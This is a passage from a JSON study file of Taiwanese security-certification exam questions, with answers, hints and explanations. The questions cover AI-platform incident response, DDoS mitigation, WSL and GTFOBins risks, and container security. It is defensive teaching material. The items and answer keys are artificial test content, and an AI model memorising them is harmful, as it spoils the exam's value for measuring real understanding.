     "stem": "情境如附圖一所示。下列何項是最有效、最優先需執行的防護與應變措施，以阻止紅隊進一步外洩AI模型或資料庫？",
     "options": [
      "重新訓練模型，使其更新權重，避免紅隊用原始模型成功外洩內容",
      "啟用Token流量管制機制，預防遭惡意大量使用",
      "立即在AI Gateway啟用行為異常偵測（Behavior Anomaly Detection），封鎖正在進行可疑快速查詢或非正常模式的API Token",
      "立即將所有AI API關閉，包含內部與外部，以阻止任何存取"
     ],
     "answer": 2,
     "context": "圖一\n某公司部署了一套落地版的 AI 推論平台，包含：語言模型 LLM 的 GPU 叢集、資料庫、AI Gateway（API 伺服器＋Prompt 防護程式）、身份驗證系統及 SOC（Security Operations Center，資安監控中心）與 SIEM（Security Information and Event Management，安全資訊與事件管理）監控。如下：\n（架構圖：Users 經 HTTPS 連到 AI Gateway；AI Gateway 內含 Token Validation、Prompt Guard、Throttling，往後連接 AI 伺服器（LNI）、Vector Database 與 Data System；IAM 身分驗證伺服器以 OIDC API Key Validation 與閘道互動；DNS/API HTTPS 連到 SOC（SIEM / SOC），Alerts 通知應變小組；Attacker 由外部對 AI 伺服器、AI Gateway 與資料庫發動攻擊。）\n近期發現 AI 系統可能遭受紅隊攻擊，包含：\n● 提示詞注入（Prompt Injection）嘗試\n● 模型外洩請求（要求輸出權重 / Embedding）\n● DNS 隧道（DNS Tunneling）外洩向量資料庫內容\n● GPU 占用異常（疑似惡意模型濫用 [Model Abuse]）\n● 大量逆向分析 API 的請求\n你作為應變組（Incident Response Team）與資安架構師，必須判斷公司最應該採取的優先防護與立即應變措施。",
     "hint": "逐項判斷兩件事：能否立即擋住正在發生的外洩？對整體服務的影響有多大？",
     "explanation": "答案 C。紅隊正在進行提示詞注入、模型外洩、DNS 隧道、API 逆向分析等攻擊，最優先的是立即遏制：在 AI Gateway 啟用行為異常偵測，封鎖正在進行可疑快速查詢或非正常模式的 API Token，直接切斷持續外洩的管道。A 重新訓練模型耗時，且攻擊者仍能繼續外洩，不是立即措施。B 啟用 Token 流量管制屬於一般性的限流預防，沒有針對已被判定異常的 Token 直接封鎖，遏制效果較不直接。D 立即關閉所有 AI API（含內部與外部），代價過大，會使正常服務全部中斷，不符合比例原則。",
     "source": "115-2 第17題"
    },
    {
     "stem": "情境如附圖一所示。你身為資安事件應變小組成員，可以採取以下哪些應變動作（附圖二）。下列選項組合何者正確？",
     "options": [
      "2、3、4",
      "6、7、8",
      "1、2、5",
      "4、6、8"
     ],
     "answer": 3,
     "context": "圖一\n某公司部署了一套落地版的 AI 推論平台，包含：語言模型 LLM 的 GPU 叢集、資料庫、AI Gateway（API 伺服器＋Prompt 防護程式）、身份驗證系統及 SOC（Security Operations Center，資安監控中心）與 SIEM（Security Information and Event Management，安全資訊與事件管理）監控。如下：\n（架構圖：Users 經 HTTPS 連到 AI Gateway；AI Gateway 內含 Token Validation、Prompt Guard、Throttling，往後連接 AI 伺服器（LNI）、Vector Database 與 Data System；IAM 身分驗證伺服器以 OIDC API Key Validation 與閘道互動；DNS/API HTTPS 連到 SOC（SIEM / SOC），Alerts 通知應變小組；Attacker 由外部對 AI 伺服器、AI Gateway 與資料庫發動攻擊。）\n近期發現 AI 系統可能遭受紅隊攻擊，包含：\n● 提示詞注入（Prompt Injection）嘗試\n● 模型外洩請求（要求輸出權重 / Embedding）\n● DNS 隧道（DNS Tunneling）外洩向量資料庫內容\n● GPU 占用異常（疑似惡意模型濫用 [Model Abuse]）\n● 大量逆向分析 API 的請求\n你作為應變組（Incident Response Team）與資安架構師，必須判斷公司最應該採取的優先防護與立即應變措施。\n附圖二\n1. 立即停用該 API Token，並強制重新產生所有 Token。\n2. 啟用 AI Gateway 的 Query 與 DB 流量限制，阻斷持續外洩通道。\n3. 將整個 AI 模型下架並進行重新訓練模型，以確保攻擊者無法繼續外洩。\n4. 對可疑 IP 進行流量封鎖，並同步分析 HTTPS 流量模式是否包含持續外洩行為。\n5. 立即將提示詞防護（Prompt Guard）升級到更嚴格模式，可完全阻止提示詞注入（Prompt Injection）。\n6. 蒐集 Gateway Logs、DB Query Logs，建立事件時間線（Timeline）。\n7. 重啟整個 GPU 叢集可以清除所有潛在攻擊者行為。\n8. 啟動跨部門 IR（法務、IT、資料保護官），根據資料外洩風險啟動資料外洩評估流程。",
     "hint": "逐一檢視附圖二每個動作：效果有沒有被誇大？代價是否與事件規模相稱？是否保留了跡證？最後才對照組合。",
     "explanation": "答案 D（4、6、8）。附圖二的 4 封鎖可疑 IP 並分析 HTTPS 流量模式、6 蒐集 Gateway 與 DB Query 日誌建立時間線、8 啟動跨部門 IR 並做資料外洩評估，都是合理的應變動作，D 全部合理。A（2、3、4）含 3：把整個模型下架並重新訓練，代價過大，也不能立即阻斷持續的外洩通道。B（6、7、8）含 7：重啟整個 GPU 叢集不可能「清除所有潛在攻擊者行為」，還可能破壞揮發性的跡證。C（1、2、5）含 5：把提示詞防護升到更嚴格，不可能「完全阻止」提示詞注入，說法過度絕對。附圖二的 1、2 本身也是合理動作，但所在的組合分別含有不合理的項目，所以只有 D 是全部正確的組合。",
     "source": "115-2 第18題"
    },
    {
     "stem": "一家企業正計畫將大型語言模型（LLM）整合至其內部知識庫系統，以提供員工智慧問答服務。為了防範與生成式 AI 相關的安全風險，下列哪些是資安團隊應優先實施的控制措施？",
     "options": [
      "對使用者輸入的提示（Prompt）進行過濾與淨化，以防禦提示注入（Prompt Injection）攻擊",
      "部署 Layer 4 網路防火牆（Network Firewall）",
      "建立嚴格的資料外洩防護（Data Loss Prevention, DLP）規則，監控並阻擋模型輸出中可能包含的敏感資訊",
      "實施基於角色的存取控制（Role-Based Access Control, RBAC），確保僅有授權員工能存取特定主題的知識庫與模型互動"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "回想 LLM 系統特有的安全風險，逐項判斷每項措施能否處理這些風險。",
     "explanation": "答案 A、C、D。這是複選題，問把 LLM 整合到內部知識庫時，資安團隊應優先實施的控制。A 對使用者輸入的提示做過濾與淨化，防禦提示注入，正確。C 建立嚴格的 DLP 規則，監控並阻擋模型輸出中可能包含的敏感資訊，正確。D 實施 RBAC，確保只有授權員工能存取特定主題的知識庫與模型互動，正確。B 部署 Layer 4 網路防火牆，只能依 IP 與埠做控制，看不到提示詞或輸出的內容，無法防提示注入與輸出洩漏，不是優先措施。",
     "source": "114-2 第14題"
    },
    {
     "stem": "企業導入 AI 提升工作流程或修訂除錯，在各大知名企業都是顯學，而 AI 安全也因應而生。企業進行 AI 模型的安全性檢測時，為識別和修復可能的 AI 安全漏洞，下列何種措施較為適切？",
     "options": [
      "僅對 AI 模型的訓練數據進行完整性檢查，而不進行模型行為分析",
      "針對 AI 系統的 API 進行測試，以識別未經身份驗證的存取或過度暴露的功能",
      "在滲透測試中，僅關注於傳統的網路基礎設施和主機漏洞，無需關注 AI 模型的特定風險",
      "僅在模型上使用靜態分析工具來檢測程式碼中的潛在問題，而不測試實際攻擊途徑"
     ],
     "answer": 1,
     "hint": "回想 AI 安全檢測應涵蓋的範圍，逐項判斷每項措施是否適切。",
     "explanation": "答案 B。對 AI 系統的 API 做測試，找出未經身分驗證的存取或過度暴露的功能，這是針對實際攻擊面的檢測，較適切。A 只對訓練資料做完整性檢查而不做模型行為分析，漏掉模型行為與輸出面的風險。C 滲透測試只看傳統網路與主機漏洞而不管 AI 模型特有風險，覆蓋不足。D 只用靜態分析檢查程式碼而不測試實際攻擊途徑，無法發現執行時的問題。",
     "source": "114-1 第31題"
    }
   ]
  },
  {
   "id": "1.2-23",
   "section": "1.2",
   "title": "DDoS 防護策略",
   "examHits": 4,
   "examRefs": [
    "115-2 第15題",
    "114-2 第19題",
    "114-2 第20題",
    "113-2 第10題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "DDoS 的防護要先看攻擊打在哪一層。大量 HTTP GET（L7 洪水）把後端資料庫連線耗盡，有效的是 CDN 分流與快取靜態內容、WAF 對單一 IP 限速、CAPTCHA 擋掉自動化機器人；封鎖所有 UDP 對這種 TCP 上的 HTTP 流量沒有幫助，還會誤傷正常服務。SYN Flood 打的是 TCP 交握，SYN Cookies、TCP 連線速率限制、由 CDN 承接連線都有效，但針對 DNS 解析的措施碰不到直接打固定 IP 的流量。資源有限時，上游業者的流量清洗是成本較低的選擇，單靠擴增頻寬太貴。DNS 遭 DDoS 時，流量清洗、避免成為 Open Resolver 都是常見做法。",
   "keyPoints": [
    "看到「HTTP GET 洪水、後端連線耗盡」→ 用 CDN、WAF 速率限制、CAPTCHA；封鎖 UDP 無關。",
    "看到「TCP SYN Flood」→ SYN Cookies、TCP 連線速率限制、由 CDN／清洗服務承接都有效；打固定 IP 的流量不經 DNS 解析，DNS 層措施碰不到。",
    "看到「資源有限的 DDoS 防護」→ 優先選成本低、可借力的措施，例如啟動上游業者的流量清洗；單靠擴增頻寬成本過高。",
    "看到「DNS 遭 DDoS」→ 流量清洗服務、避免成為 Open Resolver 是常見做法；留意「頻寬可以不管」這種前提不成立的說法。"
   ],
   "trap": "沒看清攻擊的層級與協定就套用措施（例如對 TCP 上的 HTTP 洪水去封鎖 UDP），或相信把頻寬視為可忽略就能靠過濾機制擋下 DDoS。",
   "quiz": [
    {
     "stem": "企業網站遭受大規模分散式阻斷服務（DDoS）攻擊。經分析，攻擊流量特徵為大量的HTTP GET請求（Layer 7 Flood），導致後端資料庫耗盡連線數。下列哪些防護策略適用於此情境？",
     "options": [
      "啟用CDN服務，利用邊緣節點快取靜態內容以分流請求",
      "在防火牆上封鎖所有UDP 流量",
      "設定WAF 的速率限制（Rate Limiting），針對單一IP 限制請求頻率",
      "實施人機驗證機制（如CAPTCHA），過濾自動化機器人流量"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項判斷：這項策略對題幹描述的攻擊類型是否有效？",
     "explanation": "答案 A、C、D。這是複選題，攻擊是大量 HTTP GET 請求的 Layer 7 洪水，造成後端資料庫連線耗盡。A 啟用 CDN，用邊緣節點快取靜態內容並分流請求，減輕源站負擔，正確。C 在 WAF 設定速率限制，針對單一 IP 限制請求頻率，正確。D 實施人機驗證（如 CAPTCHA），過濾自動化機器人流量，正確。B 在防火牆封鎖所有 UDP 流量，這次的攻擊是 TCP 上的 HTTP GET，封鎖 UDP 無法緩解，還可能擋掉 DNS 等正常服務，不適用。",
     "source": "115-2 第15題"
    },
    {
     "stem": "情境如附圖所示。承上題，針對 TCP SYN Flood 攻擊，下列何項應對策略可能無法有效緩解攻擊的影響？",
     "options": [
      "啟用 DNS 反向代理",
      "設定 TCP 連接速率限制",
      "啟用 SYN Cookies 機制",
      "將展示服務部署到內容派遣網路（Content Distribution Network，CDN）上，由 CDN 進行 DDoS 防禦"
     ],
     "answer": 0,
     "context": "ABC 新創公司於辦公室申請一路雙向 100Mbps 上網服務，並附 1 個固定 IP 位置，公司的連網架構如附圖一。\n以此固定 IP 在公司內部架設一台展示伺服器，提供業務人員於外部銷售時，可藉由此 IP 連線回公司進行功能展示與說明。\n附圖一、連網架構：ABC 新創公司內有展示伺服器與辦公室電腦，經 Home Gateway、100/100M FTTB 連到 Internet，業務展示人員從 Internet 連回展示伺服器。\n附圖二、主機連線記錄：Session 數折線圖（縱軸 0、1M、2M、3M，橫軸時間 16:15～17:45，標示 UTC+3）。約 16:57 起 Session 數急遽上升，約 17:00 至 17:03 維持在約 2.8M 的高點，之後降到約 1.8M，再逐步降到約 1.4M，約 17:15 後回到 0。\n附圖三、網路側錄資料：（欄位 No.、Time、Source、Destination、Protocol、Length、Info）No. 1102123 至 1102143，Time 皆為 20240312 17:15:29.85 至 29.87，Source 為各不相同的外部 IP（例：249.159.158.116、161.29.240.62、219.149.240.22、155.246.135.27、128.158.133.166…），Destination 皆為 104.71.211.xxx，Protocol 皆為 TCP，Length 皆為 66，Info 為 443 → 53476、53477、53478… 的 [SYN] Seq=0 Ack=1 Win=29200 Len=0（其中 No. 1102133、1102138、1102143 為 [TCP Retransmission] 443 → … [SYN]）。",
     "hint": "回想 SYN Flood 的攻擊原理，逐項判斷每項策略能否緩解。",
     "explanation": "答案 A。題目已把這次攻擊定為 TCP SYN Flood（傳輸層、打在 TCP 三向交握上的洪水），攻擊直接衝著公司的固定 IP，不經過 DNS 解析。A 啟用 DNS 反向代理只作用在網域名稱解析這一層，碰不到直接對固定 IP 的 TCP 連線，所以可能無法有效緩解（依題意推論，官方未說明理由）。B 設定 TCP 連接速率限制，可以限制單位時間內的連線數；C 啟用 SYN Cookies，在交握完成前不配置連線資源，是針對 SYN Flood 的標準做法；D 把展示服務部署到 CDN，由 CDN 承接連線並做 DDoS 防禦（前提是業務改用 CDN 提供的位址連線）；三者都能緩解。（附註：附圖三的封包是由外部 443 埠送往公司高號埠，判讀方向見上一題解析。）",
     "source": "114-2 第19題"
    },
    {
     "stem": "情境如附圖所示。承上題，參考美國國家標準技術研究院（NIST）創建的網路安全框架（Cyber Security Framework，CSF），請問 ABC 新創公司在資源有限的情況下，應該導入哪些 DDoS 防護機制最為合適？",
     "options": [
      "RS.CO-02：當發生 DDoS 事件時，即時與內外部利害關係人溝通",
      "ID.IM-01：擴增網路頻寬與設備效能以提高 DDoS 攻擊的門檻",
      "DE.CM-01：增設新世代防火牆限制惡意流量與偵測異常威脅",
      "RS.MA-01：一旦發生 DDoS 攻擊時可以啟動網路上游業者的流量清洗服務"
     ],
     "answer": [
      2,
      3
     ],
     "context": "ABC 新創公司於辦公室申請一路雙向 100Mbps 上網服務，並附 1 個固定 IP 位置，公司的連網架構如附圖一。\n以此固定 IP 在公司內部架設一台展示伺服器，提供業務人員於外部銷售時，可藉由此 IP 連線回公司進行功能展示與說明。\n附圖一、連網架構：ABC 新創公司內有展示伺服器與辦公室電腦，經 Home Gateway、100/100M FTTB 連到 Internet，業務展示人員從 Internet 連回展示伺服器。\n附圖二、主機連線記錄：Session 數折線圖（縱軸 0、1M、2M、3M，橫軸時間 16:15～17:45，標示 UTC+3）。約 16:57 起 Session 數急遽上升，約 17:00 至 17:03 維持在約 2.8M 的高點，之後降到約 1.8M，再逐步降到約 1.4M，約 17:15 後回到 0。\n附圖三、網路側錄資料：（欄位 No.、Time、Source、Destination、Protocol、Length、Info）No. 1102123 至 1102143，Time 皆為 20240312 17:15:29.85 至 29.87，Source 為各不相同的外部 IP（例：249.159.158.116、161.29.240.62、219.149.240.22、155.246.135.27、128.158.133.166…），Destination 皆為 104.71.211.xxx，Protocol 皆為 TCP，Length 皆為 66，Info 為 443 → 53476、53477、53478… 的 [SYN] Seq=0 Ack=1 Win=29200 Len=0（其中 No. 1102133、1102138、1102143 為 [TCP Retransmission] 443 → … [SYN]）。",
     "hint": "逐項判斷兩件事：措施在攻擊發生時能否發揮作用？是否符合題幹的資源限制？",
     "explanation": "答案 C、D。這是複選題，依 NIST 網路安全框架（CSF），ABC 新創公司在資源有限下應導入的 DDoS 防護機制。C 增設新世代防火牆，限制惡意流量並偵測異常威脅，對應 DE.CM-01（監控），為本題答案之一。D 一旦遭攻擊就啟動上游業者的流量清洗服務，借助外部資源，對應 RS.MA-01，為本題答案之一。B 擴增網路頻寬與設備效能來提高攻擊門檻，需要大量預算，與題幹「資源有限」不符。A 在發生事件時即時與內外部利害關係人溝通（RS.CO-02），屬於應變溝通作業，本題標準答案不含 A；（官方公告 C、D 或 A、C、D 皆給分，官方未說明另列 A 的理由）。",
     "source": "114-2 第20題"
    },
    {
     "stem": "機關對外服務網站無法正常提供服務，經分析 DNS 遭受混合式 DDoS 攻擊，下列建議之 DDoS 防護措施何者最「不」合適？",
     "options": [
      "可透過採購網路流量清洗服務，來緩解 DDoS 攻擊",
      "可透過限制 DNS 查詢次數，來緩解 DDoS 攻擊",
      "如果網路頻寬無須考量，可使用過濾機制來緩解 DDoS 攻擊",
      "可透過避免成為 Open Resolver 來緩解 DDoS 攻擊"
     ],
     "answer": 2,
     "hint": "回想 DNS DDoS 的常見緩解手段，逐項判斷每句建議是否合適。",
     "explanation": "答案 C。題目問 DNS 遭受混合式 DDoS 時，最「不」合適的措施。C 的前提是「如果網路頻寬無須考量」，但 DDoS 的本質就是用大量流量耗盡頻寬與資源，頻寬無法被忽略，單靠過濾機制也無法取代流量清洗或擴充，所以是官方答案之一。A 採購網路流量清洗服務，是常見的緩解方式。D 避免成為 Open Resolver，可以防止自己的 DNS 被利用來放大攻擊，是有效的做法。B 限制 DNS 查詢次數是常見的緩解手段，但官方公告 B 也給分，官方未說明理由。（官方公告 C 或 B 皆給分）",
     "source": "113-2 第10題"
    }
   ]
  },
  {
   "id": "1.2-24",
   "section": "1.2",
   "title": "WSL 與 Linux 子系統安全",
   "examHits": 4,
   "examRefs": [
    "113-1 第4題",
    "113-1 第5題",
    "113-1 第6題",
    "113-1 第7題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "WSL（Windows Subsystem for Linux）讓開發者在 Windows 上直接跑 Linux，也等於多了一個新的攻擊面：駭客的惡意腳本可以在 WSL 內執行，利用它與 Windows 的互操作性、隱藏網路流量，或利用 GTFOBins（系統中本來就有、本身不是惡意程式的二進位檔，可被濫用於提權與逃逸）。所以管理措施是：定期更新 Windows 與 Linux 子系統、不用 root 做日常操作、不要禁用防火牆與安全軟體、不共用管理者密碼，並且針對 GTFOBins 偵測與記錄使用者對敏感二進位檔的使用；EDR 監控系統活動是有效的防禦手段。要注意「現有防毒皆能偵測」這類絕對說法通常是錯的。",
   "keyPoints": [
    "看到「WSL 的最佳安全管理做法」→ 定期更新 Windows 與 Linux 子系統；常用 root、關防火牆與安全軟體、共用管理者密碼都是錯誤做法。",
    "看到「GTFOBins」→ 它濫用系統內合法的二進位檔做提權與逃逸，防毒與弱掃難以判斷，重點是偵測與記錄使用者對敏感二進位檔的使用。",
    "看到「WSL 惡意軟體的防禦」→ EDR 監控系統活動、尋找可疑事件是手段之一；說「現有防毒皆能有效識別」是絕對化的錯誤說法。",
    "看到「WSL 與 Windows 的互操作性被利用」→ 攻擊者會借助 WSL 環境的特性隱藏網路流量、掩蓋外洩行為。"
   ],
   "trap": "以為既有的防毒或弱掃就能涵蓋 WSL 的風險；GTFOBins 濫用的是合法程式，要靠行為偵測與記錄而不是特徵比對。",
   "quiz": [
    {
     "stem": "情境如附圖所示。Alex 知道 WSL2 雖然為開發人員提供了極大的便利，使他們能夠在 Windows 上無縫地運行 Linux 環境，但同時也帶來了新的安全挑戰。為了保護公司免受潛在的安全威脅，Alex 開始著手制定一套綜合的安全管理措施。下列何項是針對 WSL 所提出提升資安的最佳做法？",
     "options": [
      "經常使用 root 帳戶進行日常操作",
      "保持 Windows 和 Linux 子系統的定期更新",
      "在 WSL2 中禁用防火牆和安全軟體",
      "共用 Windows 和 Linux 子系統的系統管理者密碼"
     ],
     "answer": 1,
     "context": "在 TechSecure Inc.，一家前沿的科技安全公司，資安團隊面臨著一項前所未有的挑戰。隨著開發團隊需要更多的彈性和功能來進行軟體開發，公司決定在其開發環境中採用 Windows Subsystem for Linux 2（WSL2）。\n這個決策立即吸引了公司的資安政策制定者 Alex 的注意，身為公司資安政策訂定者，在面對公司研發團隊必須使用 Windows Subsystem for Linux 2 (WSL2)，必須對其資安攻防應建立那些安全管理措施。",
     "hint": "安全管理措施的方向是縮小風險；逐項問自己，這個做法是在降低還是增加攻擊面。",
     "explanation": "答案 B。針對 WSL 的最佳安全管理做法是保持 Windows 和 Linux 子系統定期更新，持續修補漏洞。A 經常使用 root 帳戶進行日常操作，違反最小權限原則，一旦被入侵影響範圍最大。C 在 WSL2 中禁用防火牆和安全軟體，等於拆掉防護。D 共用 Windows 和 Linux 子系統的系統管理者密碼，使一組密碼外洩就能同時控制兩邊，增加風險。",
     "source": "113-1 第4題"
    },
    {
     "stem": "情境如附圖所示。駭客首先在 WSL 環境中部署了一個專門編寫的惡意 script，該 script 旨在利用 Windows 與 WSL 之間的互操作性漏洞。請問其目的，最有可能是下列何項？（請選一個最合適的答案）",
     "options": [
      "在 Windows 創立一個隱藏的管理員帳戶，以便未來存取",
      "為了直接加密 Windows 系統文件，進行勒索軟體攻擊",
      "通過 WSL 環境檢索並傳送 Windows 系統日誌，以分析可能的弱點",
      "利用 WSL 執行環境的特性，隱藏網路流量，以掩蓋資料外洩行為"
     ],
     "answer": 3,
     "context": "與此同時，一群駭客正在密切關注 TechSecure 的這一舉措。他們計劃利用 WSL 一個未被廣泛認知的互操作性漏洞來部署惡意腳本，從而進行內部網路入侵。\n這個腳本專門設計來利用 WSL2 環境中的漏洞，目標是獲取公司的敏感數據和內部系統的控制權駭客計劃利用 Windows Subsystem for Linux (WSL) 來進行網絡入侵。",
     "hint": "回想 WSL 與 Windows 互操作的特性，逐項判斷每個目的與題幹描述是否吻合。",
     "explanation": "答案 D。題幹中駭客在 WSL 環境部署專門的惡意腳本，利用 Windows 與 WSL 之間的互操作性漏洞，目標是獲取敏感數據與內部系統控制權。最可能的目的是利用 WSL 執行環境的特性，隱藏網路流量，以掩蓋資料外洩行為，這是本題官方答案。A 在 Windows 建立隱藏的管理員帳戶、B 直接加密 Windows 系統文件做勒索、C 檢索並傳送 Windows 系統日誌分析弱點，官方答案均不採用，官方未逐項說明理由。",
     "source": "113-1 第5題"
    },
    {
     "stem": "情境如附圖所示。當使用帶有 GTFOBins 的 Windows Linux 子系統（WSL）時，下列何項措施對於增強安全性最重要？",
     "options": [
      "在 WSL 中使用防病毒軟體",
      "在 WSL 中安裝弱點掃描工具",
      "禁用 WSL 的網路功能",
      "偵測與記錄用戶對敏感二進制文件的使用"
     ],
     "answer": 3,
     "context": "在進一步的調查中，Alex 發現駭客計劃利用 GTFOBins 來執行權限提升和安全環境逃逸。這個發現迫使他對 WSL2 的安全措施進行了再次強化。\nGTFOBins 是一個關於 Unix 二進制文件如何被用於權限提升、文件操作、能力提升以及其他安全環境逃逸的技術文件。",
     "hint": "回想 GTFOBins 是什麼，逐項判斷每項措施能否偵測或防止它被濫用。",
     "explanation": "答案 D。GTFOBins 是關於 Unix 二進位檔如何被濫用於提權、檔案操作與安全環境逃逸的技術文件，被濫用的是系統內合法的二進位檔，它們本身不是惡意程式，防毒與弱掃很難據以判斷，所以最重要的是偵測並記錄使用者對敏感二進位檔的使用，才能發現異常用法。A 防毒軟體偏重惡意程式特徵，難以針對合法二進位檔的濫用。B 弱點掃描工具找的是已知漏洞，同樣不針對這種濫用。C 禁用 WSL 網路功能會使開發環境失去功能，也擋不了本機的提權與逃逸。",
     "source": "113-1 第6題"
    },
    {
     "stem": "情境如附圖所示。關於 Windows Linux 子系統（WSL）惡意軟體的特點和防禦策略，下列哪些陳述正確？",
     "options": [
      "WSL 惡意軟體有時基於開源的程式碼，使得其較難被檢測出來",
      "這些惡意軟體變種包括能夠遠端存取裝置、執行任意程式碼的複雜功能",
      "目前的防毒解決方案皆能主動偵測、有效識別和防禦這些基於 WSL 的惡意軟體",
      "EDR 監測系統活動和尋找可疑事件是防禦 WSL 類型惡意軟體的手段之一"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "通過 Alex 和他的團隊的不懈努力，TechSecure 成功地抵禦了駭客的進攻。他們的先進防禦策略不僅保護了公司的數據安全，也為整個行業樹立了如何安全使用 WSL2 的典範。從歷史軌跡追蹤 2023 年開始，駭客利用 WSL 環境日益增加，其惡意軟體數量也快速的成長。",
     "hint": "回想題幹提到的惡意程式成長趨勢與防禦手段，逐項判斷每句是否成立。",
     "explanation": "答案 A、B、D。這是複選題，問 WSL 惡意軟體的特點與防禦策略。A WSL 惡意軟體有時基於開源程式碼，官方認為較難被檢測，正確（官方未說明理由）。B 這些惡意軟體變種包括可遠端存取裝置、執行任意程式碼的複雜功能，正確。D EDR 監測系統活動並尋找可疑事件，是防禦 WSL 類型惡意軟體的手段之一，正確。C 說目前的防毒解決方案「皆能」主動偵測、有效識別並防禦這些惡意軟體，是絕對化的說法，與題幹強調的惡意軟體快速成長、難以檢測相矛盾，錯誤。",
     "source": "113-1 第7題"
    }
   ]
  },
  {
   "id": "1.2-25",
   "section": "1.2",
   "title": "雲端與容器安全防護",
   "examHits": 3,
   "examRefs": [
    "115-2 第7題",
    "115-2 第8題",
    "115-1 第14題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "雲端與容器的威脅有兩類：設定錯誤與執行期入侵。設定錯誤（例如 S3 儲存桶權限開太大）要靠雲端安全態勢管理（CSPM）持續監控組態並自動修正；執行期的威脅（容器被植入挖礦程式）要靠雲端工作負載保護平台（CWPP）掃描運行中的容器、終止受感染實例，並用乾淨的映像檔從 CI/CD 重新部署。要防止再發，要在開發流程中對容器映像檔做掃描與簽章，只讓受信任的映像檔能部署；做出口流量過濾（Egress Filtering）擋住挖礦等異常對外連線；用零信任原則限制叢集內各服務之間的存取。WAF、EPP、IPS 各管各的層面，不是為了雲端組態錯誤而設計。",
   "keyPoints": [
    "看到「雲端設定錯誤造成外洩（如 S3 權限）」→ CSPM（雲端安全態勢管理）持續監控並自動修正組態；WAF、EPP、IPS 不處理組態。",
    "看到「容器被入侵、要立刻恢復並清除」→ 用 CWPP 掃描運行容器、終止受感染實例，同時觸發 CI/CD 以乾淨映像重新部署；手動逐台處理又慢又漏。",
    "看到「基礎映像檔被植入」→ 重新部署前要確認映像來源是乾淨的，否則會把惡意程式再帶上線。",
    "看到「防止再發的強化措施」→ 映像掃描與簽章、出口流量過濾、叢集內零信任存取限制；與事件無關的措施（如開發者電腦的文書軟體）不算。"
   ],
   "trap": "把 CSPM 與 CWPP 搞混：CSPM 看的是雲端資源的「設定」，CWPP 看的是執行中的「工作負載」；以及忽略重新部署所用的映像檔本身可能已被汙染。",
   "quiz": [
    {
     "stem": "情境如附圖所示。身為平台的資安應變經理，為了緊急恢復平台服務並清除所有受感染的容器，下列哪一項防護與應變實務在技術上最為即時且有效？",
     "options": [
      "要求雲端服務供應商出具一份完整的事件調查報告",
      "利用雲端工作負載保護平台（CWPP）掃描運行中的容器，識別並終止所有受感染的實例（Instance），同時觸發 CI/CD流程以乾淨的映像檔重新部署",
      "立即重新部署整個Kubernetes 叢集，並從原始的映像檔進行重新安裝",
      "手動登入每一台主機節點，一一找出並刪除惡意程序"
     ],
     "answer": 1,
     "context": "「Q 公司」是一家快速成長的線上餐飲外送平台，其核心系統完全建構於雲端環境，並採用容器化技術部署在公有雲的 Kubernetes 叢集上。為提升使用者體驗，平台整合了一套第三方的 AI 智慧推薦引擎，用於分析使用者偏好並推薦餐廳。某個週五晚餐尖峰時段，維運團隊收到大量客訴，反應平台網站和 App 反應速度極慢，幾近癱瘓。經緊急排查，發現執行主要業務邏輯的容器（Pods）CPU 使用率飆升至 100%。資安團隊介入調查後，確認是攻擊者利用了 AI 推薦引擎一個未修補的遠端程式碼執行（RCE）漏洞，取得初步存取權後，橫向移動至內部的容器映像檔儲存庫（Container Registry），並在網站應用程式的基礎映像檔（Base Image）中植入加密貨幣挖礦程式。",
     "hint": "逐項判斷：處置速度夠不夠快？能否清除所有受感染容器且不再被重新感染？",
     "explanation": "答案 B。事件中容器 CPU 飆升至 100%，攻擊者取得存取權後橫向移動到容器映像檔儲存庫，在基礎映像檔中植入挖礦程式。B 利用 CWPP 掃描運行中的容器，找出並終止所有受感染的實例，同時觸發 CI/CD 流程以乾淨的映像檔重新部署，同時處理執行中的實例與重建來源，自動化且最即時有效。A 要求雲端服務供應商出具完整的事件調查報告，無法立即恢復服務。C 立即重新部署整個 Kubernetes 叢集並從原始的映像檔重新安裝，若使用的映像仍是被植入的版本，等於把挖礦程式重新帶上線，也過於粗暴。D 手動登入每台主機節點逐一刪除惡意程序，費時、容易遺漏，也無法處理被汙染的基礎映像檔。",
     "source": "115-2 第7題"
    },
    {
     "stem": "情境如附圖所示。身為平台的資安應變經理，為了徹底解決此次事件暴露出的防護架構問題，並防止未來類似攻擊發生，平台應採取下列哪些防護強化措施？",
     "options": [
      "為所有開發人員的電腦安裝最新版的文書處理軟體",
      "在開發流程中導入容器映像檔掃描與簽章機制，確保僅有受信任的映像檔能被部署",
      "實施更嚴格的網路出口流量過濾規則（Egress Filtering），阻擋加密貨幣挖礦等異常的對外連線",
      "建立零信任網路原則，嚴格限制Kubernetes 叢集內部不同服務之間的存取權限"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "context": "「Q 公司」是一家快速成長的線上餐飲外送平台，其核心系統完全建構於雲端環境，並採用容器化技術部署在公有雲的 Kubernetes 叢集上。為提升使用者體驗，平台整合了一套第三方的 AI 智慧推薦引擎，用於分析使用者偏好並推薦餐廳。某個週五晚餐尖峰時段，維運團隊收到大量客訴，反應平台網站和 App 反應速度極慢，幾近癱瘓。經緊急排查，發現執行主要業務邏輯的容器（Pods）CPU 使用率飆升至 100%。資安團隊介入調查後，確認是攻擊者利用了 AI 推薦引擎一個未修補的遠端程式碼執行（RCE）漏洞，取得初步存取權後，橫向移動至內部的容器映像檔儲存庫（Container Registry），並在網站應用程式的基礎映像檔（Base Image）中植入加密貨幣挖礦程式。",
     "hint": "回顧事件經過，逐項問：這項措施能否防止同類攻擊再發生？",
     "explanation": "答案 B、C、D。這是複選題，問徹底解決事件暴露的防護架構問題、防止再發的強化措施。B 在開發流程導入容器映像檔掃描與簽章機制，確保只有受信任的映像檔能被部署，直接對應基礎映像檔被植入的問題，正確。C 實施更嚴格的出口流量過濾（Egress Filtering），阻擋挖礦等異常對外連線，正確。D 建立零信任網路原則，嚴格限制 Kubernetes 叢集內部不同服務之間的存取權限，縮小橫向移動的空間，正確。A 為所有開發人員的電腦安裝最新版的文書處理軟體，與這次事件的成因無關，不屬於有效的強化措施。",
     "source": "115-2 第8題"
    },
    {
